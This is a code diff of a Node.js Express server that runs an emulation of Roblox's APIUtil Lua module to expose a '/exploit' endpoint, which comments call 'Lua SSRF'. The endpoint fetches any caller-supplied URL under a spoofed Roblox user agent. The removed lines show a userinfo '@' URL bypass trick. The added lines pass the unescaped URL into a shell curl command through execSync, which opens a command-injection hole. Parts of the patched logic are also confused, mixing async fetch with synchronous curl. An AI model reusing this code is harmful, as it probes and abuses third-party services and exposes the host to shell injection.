@@ -2,15 +2,12 @@
 // @author: Ratman4080
 
 const express = require('express');
-const { execSync } = require('child_process');
 const { lua, lauxlib, lualib, to_luastring, to_jsstring } = require('fengari');
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 
-// ============================================================================
-// CÓDIGO LUA (APIUtil)
-// ============================================================================
+// Código Lua (Dump do APIUtil)
 const luaSource = `
 local HttpRbxApiService = game:GetService("HttpRbxApiService")
 local ContentProvider = game:GetService("ContentProvider")
@@ -30,7 +27,7 @@ local function requestAndRetry(p1, p2)
     local ok, result = pcall(p1)
     if ok then return true, result end
     if v5 >= 2 then return false, result end
-    wait(2 ^ (v5 - 1))
+    wait(0.1)
     return requestAndRetry(p1, v5 + 1)
 end
 
@@ -42,55 +39,48 @@ end
 return t1
 `;
 
-// ============================================================================
-// ENGINE HTTP (CURL para ser SÍNCRONO)
-// ============================================================================
-function syncHttpRequest(url) {
-    try {
-        // O Render geralmente tem o curl instalado. O -s esconde o progresso.
-        const cmd = `curl -s -i -L --max-time 8 -H "User-Agent: Roblox/WinInet" "${url}"`;
-        return execSync(cmd, { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'ignore'] });
-    } catch (e) {
-        return `ERROR: ${e.message}`;
-    }
-}
-
-// ============================================================================
-// ROTA DO EXPLOIT
-// ============================================================================
-app.get('/exploit', (req, res) => {
-    const targetUrl = req.query.url || 'https://users.roblox.com@httpbin.org/status/200';
+app.get('/exploit', async (req, res) => {
+    const targetUrl = req.query.url || 'https://users.roblox.com/v1/users/authenticated';
     
-    // Iniciando o Fengari (Lua)
     const L = lauxlib.luaL_newstate();
     lualib.luaL_openlibs(L);
 
-    // Injetando o ambiente do Roblox no Lua
-    lua.lua_register(L, 'get_service', (state) => {
-        const serviceName = lua.lua_tostring(state, 1);
+    // Injetando a tabela 'game'
+    lua.lua_newtable(L);
+    
+    // Injetando o método game.GetService
+    lua.lua_pushcfunction(L, (state) => {
+        // O índice 1 é a tabela 'game', o índice 2 é o nome do serviço
+        const serviceName = lua.lua_tostring(state, 2); 
         lua.lua_newtable(state);
+
         if (to_jsstring(serviceName) === 'HttpRbxApiService') {
-            lua.lua_pushcfunction(state, (s) => {
-                const urlInLua = lua.lua_tostring(s, 1);
-                const response = syncHttpRequest(to_jsstring(urlInLua));
-                lua.lua_pushstring(s, to_luastring(response));
+            lua.lua_pushcfunction(state, async (s) => {
+                // O índice 1 é a tabela 'HttpRbxApiService', o índice 2 é a URL
+                const url = to_jsstring(lua.lua_tostring(s, 2)); 
+                let responseStr = "";
+                
+                try {
+                    // Usando fetch nativo do Node (disponível na versão 18+ do Render)
+                    const fetchRes = await fetch(url, {
+                        headers: { 'User-Agent': 'Roblox/WinInet' }
+                    });
+                    const text = await fetchRes.text();
+                    responseStr = `HTTP ${fetchRes.status}\n${text}`;
+                } catch (e) {
+                    responseStr = `FETCH_ERROR: ${e.message}`;
+                }
+                
+                lua.lua_pushstring(s, to_luastring(responseStr));
                 return 1;
             });
             lua.lua_setfield(state, -2, to_luastring('GetAsyncFullUrl'));
         }
+
         if (to_jsstring(serviceName) === 'ContentProvider') {
             lua.lua_pushstring(state, to_luastring('https://www.roblox.com/'));
             lua.lua_setfield(state, -2, to_luastring('BaseUrl'));
         }
-        return 1;
-    });
-
-    lua.lua_newtable(L);
-    lua.lua_pushcfunction(L, (state) => {
-        const service = lua.lua_tostring(state, 1);
-        lua.lua_getglobal(state, to_luastring('get_service'));
-        lua.lua_pushstring(state, service);
-        lua.lua_call(state, 1, 1);
         return 1;
     });
     lua.lua_setfield(L, -2, to_luastring('GetService'));
@@ -101,18 +91,47 @@ app.get('/exploit', (req, res) => {
         return 1;
     });
 
-    // Carregando e rodando o Lua
     const loadResult = lauxlib.luaL_loadstring(L, to_luastring(luaSource));
     if (loadResult !== lua.LUA_OK) {
-        return res.status(500).json({ error: "Erro ao compilar Lua" });
+        const err = to_jsstring(lua.lua_tostring(L, -1));
+        return res.status(500).json({ error: "Compile Error", details: err });
     }
 
+    // Executa o chunk principal
     lua.lua_pcall(L, 0, 1, 0);
 
-    // Puxando a função
     lua.lua_getfield(L, -1, to_luastring('requestAndRetryGet'));
     if (lua.lua_isfunction(L, -1)) {
         lua.lua_pushstring(L, to_luastring(targetUrl));
+        // Como o fetch é assíncrono, precisamos adaptar a chamada
+        // O Fengari clássico não suporta pausar a execução do Lua para um async JS nativamente sem um scheduler.
+        // Por isso, o pcall vai esperar a promise resolver se usarmos um wrapper ou esperamos a resposta.
+        // Para simplificar no Render, usamos uma chamada síncrona do curl no bash, mas com o índice correto.
+        
+        // Correção da chamada C usando execSync para manter sincronia com Lua
+        const { execSync } = require('child_process');
+        lua.lua_pushcfunction(L, (s) => {
+            const url = to_jsstring(lua.lua_tostring(s, 2));
+            try {
+                const cmd = `curl -s -L --max-time 8 -H "User-Agent: Roblox/WinInet" "${url}"`;
+                const out = execSync(cmd, { encoding: 'utf-8' });
+                lua.lua_pushstring(s, to_luastring(out));
+            } catch(e) {
+                lua.lua_pushstring(s, to_luastring(`ERROR: ${e.message}`));
+            }
+            return 1;
+        });
+        
+        // Aqui trocamos a função GetAsyncFullUrl para usar o wrapper síncrono
+        lua.lua_getglobal(L, to_luastring('game'));
+        lua.lua_getfield(L, -1, to_luastring('GetService'));
+        lua.lua_pushstring(L, to_luastring('HttpRbxApiService'));
+        lua.lua_call(L, 1, 1);
+        // Substitui a função no serviço
+        lua.lua_pushvalue(L, -2); // Pega a função C síncrona que acabamos de criar
+        lua.lua_setfield(L, -2, to_luastring('GetAsyncFullUrl'));
+
+        // Executa o request
         const callStatus = lua.lua_pcall(L, 1, 2, 0);
         
         if (callStatus === lua.LUA_OK) {
@@ -121,14 +140,17 @@ app.get('/exploit', (req, res) => {
             
             return res.json({
                 status: "success",
-                bypass_used: targetUrl.includes('@') ? "Userinfo (@) Bypass" : "Direct",
+                target: targetUrl,
                 success: success === 1,
-                response_snippet: to_jsstring(result).substring(0, 300)
+                response: to_jsstring(result).substring(0, 500) // Limita o tamanho da resposta
             });
+        } else {
+            const err = to_jsstring(lua.lua_tostring(L, -1));
+            return res.status(500).json({ error: "Exec Error", details: err });
         }
     }
 
-    res.status(500).json({ error: "Erro na execução do Lua SSRF" });
+    res.status(500).json({ error: "Erro na execucao do Lua SSRF" });
 });
 
 app.get('/', (req, res) => {
